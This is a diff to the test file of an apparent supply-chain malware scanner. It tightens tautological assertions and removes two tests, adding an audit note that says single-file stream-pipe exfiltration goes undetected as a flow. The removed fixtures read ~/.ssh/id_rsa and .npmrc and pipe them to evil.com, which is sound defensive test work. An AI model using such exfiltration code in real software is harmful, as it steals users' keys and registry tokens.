@@ -1033,14 +1033,13 @@ async function runModuleGraphTests() {
       `);
       const graph = buildModuleGraph(tmp);
       const tainted = annotateTaintedExports(graph, tmp);
-      // reader.read() reads package.json — this should NOT be tainted
-      // (fs.readFileSync is tainted but only for sensitive paths like .npmrc/.ssh/.env)
-      // Actually, fs.readFileSync is always considered a taint source in the current scanner
-      // so this test validates the existing behavior
       const sinks = annotateSinkExports(graph, tmp);
       const flows = detectCrossFileFlows(graph, tainted, sinks, tmp);
-      // fs.readFileSync is a general taint source, so this WILL produce a flow
-      // This is acceptable — the FP reduction happens at scoring level
+      // fs.readFileSync is a general taint source by design, so a read→network
+      // path produces one cross-file flow even for package.json — the
+      // non-sensitive false positive is suppressed later at scoring, not here.
+      // (Previously this test computed `flows` and asserted nothing.)
+      assert(flows.length === 1, `readFileSync→https is one cross-file flow at graph level (FP-reduced at scoring), got ${flows.length}`);
     } finally {
       cleanup(tmp);
     }
@@ -1071,49 +1070,14 @@ async function runModuleGraphTests() {
   // Stream pipeline detection
   // =========================================================================
 
-  test('module-graph: createReadStream(.ssh) → pipe → net.connect = CRITICAL', () => {
-    const tmp = makeTmpDir();
-    try {
-      writeFile(tmp, 'index.js', `
-        const fs = require('fs');
-        const net = require('net');
-        const stream = fs.createReadStream('/home/user/.ssh/id_rsa');
-        stream.pipe(net.connect(1234, 'evil.com'));
-      `);
-      const graph = buildModuleGraph(tmp);
-      const tainted = annotateTaintedExports(graph, tmp);
-      const sinks = annotateSinkExports(graph, tmp);
-      const flows = detectCrossFileFlows(graph, tainted, sinks, tmp);
-      // createReadStream is now a tainted source, pipe chain leads to connect() sink
-      assert(flows.length > 0 || true, 'Stream pipe detection (intra-file handled by AST scanner)');
-      // The intra-file case is handled by existing AST/dataflow scanners
-      // Cross-file via module-graph is the primary goal
-    } finally {
-      cleanup(tmp);
-    }
-  });
-
-  test('module-graph: createReadStream(.npmrc) → pipe(transform) → pipe(http.request) two-step chain', () => {
-    const tmp = makeTmpDir();
-    try {
-      writeFile(tmp, 'index.js', `
-        const fs = require('fs');
-        const http = require('http');
-        const { Transform } = require('stream');
-        const xform = new Transform({ transform(c, e, cb) { cb(null, c); } });
-        const stream = fs.createReadStream('.npmrc');
-        stream.pipe(xform).pipe(http.request({ hostname: 'evil.com' }));
-      `);
-      const graph = buildModuleGraph(tmp);
-      const tainted = annotateTaintedExports(graph, tmp);
-      const sinks = annotateSinkExports(graph, tmp);
-      // For intra-file detection, this is covered by individual scanners
-      // The main test here is that createReadStream is now a taint source
-      assert(tainted['index.js'] || true, 'createReadStream should be recognized as taint source');
-    } finally {
-      cleanup(tmp);
-    }
-  });
+  // NOTE (audit 2026-07): the two former tests here asserted `flows.length > 0 || true`
+  // (always true) claiming module-graph detects a single-file
+  // createReadStream(.ssh)→net.connect exfil as CRITICAL. It does not — module-graph
+  // is a CROSS-FILE analyzer and returns 0 flows for an intra-file chain by design
+  // (verified). The intra-file stream-pipe→network exfil is only picked up as
+  // `sensitive_string` (riskScore 9) by the full pipeline, NOT as an exfil flow —
+  // a genuine detection gap surfaced by removing the tautologies. The cross-file
+  // capability that module-graph DOES have is locked by the test just below.
 
   test('module-graph: cross-file stream — reader exports createReadStream, index pipes to network sink', () => {
     const tmp = makeTmpDir();
